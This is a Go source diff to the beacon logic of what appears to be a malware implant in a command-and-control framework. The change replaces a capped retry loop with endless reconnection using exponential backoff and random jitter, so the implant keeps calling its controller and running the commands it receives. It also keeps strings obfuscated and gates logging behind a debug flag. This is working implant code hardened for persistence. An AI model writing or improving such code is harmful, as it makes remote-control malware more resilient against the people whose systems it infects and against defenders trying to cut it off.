@@ -242,27 +242,34 @@ func (i *Implant) createAuthContext() context.Context {
 
 // StartBeaconStream starts the bidirectional beacon stream with retry logic
 func (i *Implant) StartBeaconStream() error {
-	maxStreamRetries := 5
-	streamRetryDelay := 5 * time.Second
+	baseRetryDelay := 5 * time.Second
+	maxRetryDelay := 60 * time.Second
+	currentDelay := baseRetryDelay
 
-	for streamAttempt := 1; streamAttempt <= maxStreamRetries; streamAttempt++ {
+	for {
 		ctx := i.createAuthContext()
 		stream, err := i.client.BeaconStream(ctx)
 		if err != nil {
 			i.retryCount++
-			if streamAttempt < maxStreamRetries {
-				time.Sleep(streamRetryDelay)
-				continue
+			if DebugMode {
+				log.Printf("Failed to start beacon stream (attempt %d): %v, retrying in %v", i.retryCount, err, currentDelay)
 			}
-			return fmt.Errorf("failed to start beacon stream after %d attempts: %v", maxStreamRetries, err)
+			time.Sleep(currentDelay)
+			// Exponential backoff with cap
+			currentDelay = time.Duration(float64(currentDelay) * 1.5)
+			if currentDelay > maxRetryDelay {
+				currentDelay = maxRetryDelay
+			}
+			continue
 		}
 
 		if p, ok := peer.FromContext(stream.Context()); ok {
 			i.RemoteAddr = p.Addr.String()
 		}
 
-		// Reset retry count on successful connection
+		// Reset retry count and delay on successful connection
 		i.retryCount = 0
+		currentDelay = baseRetryDelay
 
 		// Send initial beacon
 		initialBeacon := &pb.BeaconMessage{
@@ -274,11 +281,11 @@ func (i *Implant) StartBeaconStream() error {
 		}
 
 		if err := stream.Send(initialBeacon); err != nil {
-			if streamAttempt < maxStreamRetries {
-				time.Sleep(streamRetryDelay)
-				continue
+			if DebugMode {
+				log.Printf("Failed to send initial beacon: %v, reconnecting...", err)
 			}
-			return fmt.Errorf("failed to send initial beacon: %v", err)
+			time.Sleep(currentDelay)
+			continue
 		}
 
 		if DebugMode {
@@ -289,27 +296,25 @@ func (i *Implant) StartBeaconStream() error {
 		heartbeatDone := make(chan struct{})
 		go i.heartbeatLoopWithRecovery(stream, heartbeatDone)
 
-		// Handle incoming commands with recovery
-		for {
+		// Handle incoming commands - loop until stream breaks
+		streamActive := true
+		for streamActive {
 			cmd, err := stream.Recv()
 			if err == io.EOF {
 				if DebugMode {
-					log.Println(deobfStr("stream_closed"))
+					log.Println(deobfStr("stream_closed") + " - reconnecting...")
 				}
 				close(heartbeatDone)
-				return nil // Connection closed gracefully, don't retry
+				streamActive = false
+				continue
 			}
 			if err != nil {
 				if DebugMode {
-					log.Printf("Stream receive error: %v", err)
+					log.Printf("Stream receive error: %v, reconnecting...", err)
 				}
 				close(heartbeatDone)
-				// Try to reconnect if we haven't exhausted retries
-				if streamAttempt < maxStreamRetries {
-					time.Sleep(streamRetryDelay)
-					break // Break inner loop to retry stream creation
-				}
-				return fmt.Errorf("stream receive failed after retries: %v", err)
+				streamActive = false
+				continue
 			}
 
 			if DebugMode {
@@ -317,9 +322,10 @@ func (i *Implant) StartBeaconStream() error {
 			}
 			go i.ExecuteCommand(stream, cmd)
 		}
-	}
 
-	return nil
+		// Brief delay before reconnecting
+		time.Sleep(baseRetryDelay + time.Duration(mathrand.Intn(5))*time.Second)
+	}
 }
 
 // heartbeatLoop maintains the heartbeat with the server
